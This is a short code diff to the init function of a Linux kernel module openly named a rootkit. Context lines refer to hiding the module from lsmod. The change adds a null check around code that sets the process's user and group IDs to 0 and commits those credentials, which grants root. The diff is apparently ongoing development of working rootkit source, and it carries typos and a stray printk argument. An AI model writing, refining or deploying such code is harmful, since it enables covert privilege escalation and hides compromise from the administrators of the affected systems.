@@ -57,13 +57,17 @@ static int __init rootkit_init(void)
    // printk("invisible: module loaded\n");
    /*end invisible lsmod kernel*/
 
-
    /* grant root access */
    struct cred *creds = prepare_creds();
-   creds->uid.val = creds->euid.val = 0;
-   creds->gid.val = creds->egid.val = 0;
-   commit_creds(creds);
-   printk(KERN_INFO "rootkit says: Granted toot access\n", name);
+   if (!creds)
+      printk(KERN_INFO "can not grant root acces\n");
+   else
+   {
+      creds->uid.val = creds->euid.val = 0;
+      creds->gid.val = creds->egid.val = 0;
+      commit_creds(creds);
+      printk(KERN_INFO "rootkit says: Granted toot access\n", name);
+   }
 
    return 0;
 }
